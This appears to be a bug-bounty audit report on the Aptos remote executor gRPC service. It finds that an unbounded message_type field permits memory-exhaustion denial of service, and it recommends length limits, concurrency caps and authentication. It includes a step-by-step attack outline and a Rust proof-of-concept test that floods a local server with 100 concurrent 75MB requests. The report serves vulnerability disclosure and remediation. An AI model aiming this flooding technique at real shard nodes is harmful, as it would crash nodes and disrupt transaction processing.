# Audit Report

## Title
Remote Executor gRPC Service: Unbounded `message_type` String Enables Memory Exhaustion DoS

## Summary
The `NetworkMessage` protobuf definition in the remote executor service contains an unbounded `message_type` string field. An attacker with network access to the remote executor gRPC service can send concurrent requests with extremely long `message_type` strings (up to 80MB each), causing memory exhaustion and node crashes.

## Finding Description

The remote executor service uses a protobuf-based gRPC interface for inter-shard communication. The `NetworkMessage` structure has two fields: `message` (bytes) and `message_type` (string). [1](#0-0) 

The `message_type` field is an unbounded string with no length validation. The gRPC server only enforces a total message size limit of 80MB: [2](#0-1) [3](#0-2) 

When processing incoming messages, the server deserializes the entire `NetworkMessage` including the `message_type` string, allocating memory for it: [4](#0-3) 

The `MessageType` wrapper simply stores the string without any validation: [5](#0-4) 

**Attack Vector:**
1. Attacker establishes multiple concurrent gRPC connections to a remote executor shard endpoint
2. Each connection sends a `NetworkMessage` with a `message_type` containing ~75-78MB of arbitrary characters
3. The tonic gRPC server has no explicit concurrency limit
4. Each concurrent request allocates memory during deserialization and holds it during handler execution
5. With sufficient concurrent requests (e.g., 100 requests × 75MB = 7.5GB), the shard node exhausts available memory
6. The node crashes or becomes unresponsive, disrupting sharded execution

This breaks **Invariant #9: Resource Limits** - the protocol fails to enforce proper limits on message field sizes, allowing unbounded resource consumption.

## Impact Explanation

This vulnerability enables a **Denial of Service attack** against remote executor shard nodes through memory exhaustion. According to Aptos bug bounty severity categories, this qualifies as **High Severity** because it can cause:

- **Validator node slowdowns**: Memory pressure degrades performance before crash
- **API crashes**: OOM kills the shard process, interrupting block execution
- **Significant protocol violations**: Violates resource limit invariants

While this doesn't directly steal funds or break consensus safety, it impacts network availability and block execution throughput. A successful attack on multiple shards could severely degrade or halt transaction processing across the network.

## Likelihood Explanation

**Likelihood: Medium to High** (depending on network exposure)

**Attack Requirements:**
- Network access to the remote executor gRPC service endpoints (typically internal services)
- Ability to establish multiple concurrent gRPC connections
- No authentication required (service has no auth layer)

**Mitigating Factors:**
- Remote executor services are likely deployed on internal networks, not directly exposed to the internet
- Requires knowledge of shard endpoint addresses
- Proper network segmentation would limit access

**Aggravating Factors:**
- No authentication or authorization on the gRPC service
- No per-field size validation in protobuf schema
- No concurrency limits on the tonic server
- Even with internal deployment, a compromised component could exploit this
- Misconfiguration could accidentally expose services

The lack of defense-in-depth protections means that any attacker who gains network access (through compromise, misconfiguration, or insider threat) can immediately exploit this vulnerability.

## Recommendation

Implement multiple layers of protection:

**1. Add field-level size limits in protobuf:**
```protobuf
message NetworkMessage {
  bytes message = 1;
  // Limit message_type to reasonable length (e.g., 256 bytes)
  string message_type = 2 [(validate.rules).string.max_len = 256];
}
```

**2. Add validation in the handler:**
```rust
async fn simple_msg_exchange(
    &self,
    request: Request<NetworkMessage>,
) -> Result<Response<Empty>, Status> {
    let network_message = request.into_inner();
    
    // Validate message_type length
    const MAX_MESSAGE_TYPE_LEN: usize = 256;
    if network_message.message_type.len() > MAX_MESSAGE_TYPE_LEN {
        return Err(Status::invalid_argument(
            format!("message_type exceeds maximum length of {}", MAX_MESSAGE_TYPE_LEN)
        ));
    }
    
    let msg = Message::new(network_message.message);
    let message_type = MessageType::new(network_message.message_type);
    // ... rest of handler
}
```

**3. Add concurrency limits to the tonic server:**
```rust
Server::builder()
    .timeout(std::time::Duration::from_millis(rpc_timeout_ms))
    .concurrency_limit_per_connection(10)
    .add_service(
        NetworkMessageServiceServer::new(self)
            .max_decoding_message_size(MAX_MESSAGE_SIZE)
    )
    // ... rest of server config
```

**4. Implement authentication** (mutual TLS or token-based auth) to prevent unauthorized access.

## Proof of Concept

```rust
// Add to secure/net/src/grpc_network_service/mod.rs tests

#[tokio::test]
async fn test_large_message_type_memory_exhaustion() {
    use aptos_protos::remote_executor::v1::{
        network_message_service_client::NetworkMessageServiceClient, NetworkMessage,
    };
    use std::net::{IpAddr, Ipv4Addr, SocketAddr};
    use tokio::runtime::Runtime;

    // Start server
    let server_addr = SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), 50051);
    let server_handlers = Arc::new(Mutex::new(HashMap::new()));
    
    let (msg_tx, _msg_rx) = crossbeam_channel::unbounded();
    server_handlers
        .lock()
        .unwrap()
        .insert(MessageType::new("test".to_string()), msg_tx);
    
    let server = GRPCNetworkMessageServiceServerWrapper::new(server_handlers, server_addr);
    let rt = Runtime::new().unwrap();
    let (shutdown_tx, shutdown_rx) = oneshot::channel();
    
    server.start(&rt, "test".to_string(), server_addr, 5000, shutdown_rx);
    
    // Wait for server to start
    tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
    
    // Create malicious message with huge message_type (75MB)
    let huge_message_type = "A".repeat(75 * 1024 * 1024);
    
    // Send multiple concurrent requests
    let mut handles = vec![];
    for _ in 0..100 {
        let msg_type = huge_message_type.clone();
        handles.push(tokio::spawn(async move {
            let mut client = NetworkMessageServiceClient::connect(format!("http://{}", server_addr))
                .await
                .unwrap()
                .max_decoding_message_size(80 * 1024 * 1024);
            
            let request = tonic::Request::new(NetworkMessage {
                message: vec![0u8; 1024], // Small message payload
                message_type: msg_type,    // Huge message_type
            });
            
            client.simple_msg_exchange(request).await
        }));
    }
    
    // This would cause memory exhaustion on the server
    // In production, this would crash the node
    
    for handle in handles {
        let _ = handle.await;
    }
    
    shutdown_tx.send(()).unwrap();
}
```

**To observe the vulnerability:**
1. Monitor memory usage of the server process
2. Send concurrent requests with 75MB `message_type` strings
3. Observe memory consumption growing by ~7.5GB (100 × 75MB)
4. Node eventually crashes with OOM error or becomes unresponsive

**Notes**

This vulnerability exists because the protobuf schema lacks field-level constraints and the implementation lacks runtime validation. While the remote executor service is designed for internal use, the absence of authentication and proper resource limits violates defense-in-depth principles. Even internal services should protect against resource exhaustion, as a compromised component or misconfiguration could enable exploitation.

The `message_type` field is used purely for routing and typically contains short strings like `"remote_kv_request"` or `"execute_command_0"`. There is no legitimate use case for multi-megabyte message types, making a strict length limit (e.g., 256 bytes) appropriate without impacting functionality.

### Citations

**File:** protos/rust/src/pb/aptos.remote_executor.v1.rs (L7-13)
```rust
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct NetworkMessage {
    #[prost(bytes="vec", tag="1")]
    pub message: ::prost::alloc::vec::Vec<u8>,
    #[prost(string, tag="2")]
    pub message_type: ::prost::alloc::string::String,
}
```

**File:** secure/net/src/grpc_network_service/mod.rs (L23-23)
```rust
const MAX_MESSAGE_SIZE: usize = 1024 * 1024 * 80;
```

**File:** secure/net/src/grpc_network_service/mod.rs (L75-79)
```rust
        Server::builder()
            .timeout(std::time::Duration::from_millis(rpc_timeout_ms))
            .add_service(
                NetworkMessageServiceServer::new(self).max_decoding_message_size(MAX_MESSAGE_SIZE),
            )
```

**File:** secure/net/src/grpc_network_service/mod.rs (L93-115)
```rust
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
```

**File:** secure/net/src/network_controller/mod.rs (L30-44)
```rust
#[derive(Clone, Debug, Deserialize, Serialize, Eq, Hash, PartialEq)]
#[allow(dead_code)]
pub struct MessageType {
    message_type: String,
}

impl MessageType {
    pub fn new(message_type: String) -> Self {
        Self { message_type }
    }

    pub fn get_type(&self) -> String {
        self.message_type.clone()
    }
}
```
